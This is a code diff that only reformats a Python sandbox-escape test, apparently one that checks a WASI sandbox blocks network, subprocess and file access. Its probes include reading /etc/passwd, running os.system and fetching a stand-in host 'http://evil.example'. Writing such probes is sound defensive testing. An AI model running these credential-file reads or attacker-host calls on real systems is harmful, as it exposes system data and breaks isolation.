@@ -7,7 +7,15 @@ from typing import Any
 # imported at run time is not in the snapshot (ModuleNotFoundError), which
 # would hide what WASI itself permits.
 _IMPORTS: dict[str, Any] = {}
-for _name in ("socket", "subprocess", "threading", "urllib.request", "ssl", "asyncio", "multiprocessing"):
+for _name in (
+    "socket",
+    "subprocess",
+    "threading",
+    "urllib.request",
+    "ssl",
+    "asyncio",
+    "multiprocessing",
+):
     try:
         _IMPORTS[_name] = __import__(_name, fromlist=["_"])
     except BaseException as _ex:
@@ -60,7 +68,14 @@ def run(host: Any) -> list[dict[str, Any]]:
     import os
 
     return [
-        {"probe": "build-time imports", "ok": True, "result": {k: (v if isinstance(v, str) else "imported") for k, v in _IMPORTS.items()}},
+        {
+            "probe": "build-time imports",
+            "ok": True,
+            "result": {
+                k: (v if isinstance(v, str) else "imported")
+                for k, v in _IMPORTS.items()
+            },
+        },
         _try("open('/etc/passwd')", lambda: open("/etc/passwd").read(64)),
         _try("open('/tmp/x', 'w')", _open_write),
         _try("os.listdir('/')", lambda: os.listdir("/")),
@@ -72,7 +87,18 @@ def run(host: Any) -> list[dict[str, Any]]:
         _try("subprocess.run", _subprocess),
         _try("threading.Thread", _thread),
         _try("os.system", lambda: os.system("echo hi")),
-        _try("host.generate (mediated)", lambda: json.loads(host.generate(json.dumps({"input": "ping"})))["choices"][0]["message"]["content"]),
-        _try("host.fetch('allowlist')", lambda: host.fetch("allowlist", json.dumps({"domain": "example.com"}))),
-        _try("host.fetch('http://evil.example')", lambda: host.fetch("http://evil.example", "{}")),
+        _try(
+            "host.generate (mediated)",
+            lambda: json.loads(host.generate(json.dumps({"input": "ping"})))["choices"][
+                0
+            ]["message"]["content"],
+        ),
+        _try(
+            "host.fetch('allowlist')",
+            lambda: host.fetch("allowlist", json.dumps({"domain": "example.com"})),
+        ),
+        _try(
+            "host.fetch('http://evil.example')",
+            lambda: host.fetch("http://evil.example", "{}"),
+        ),
     ]
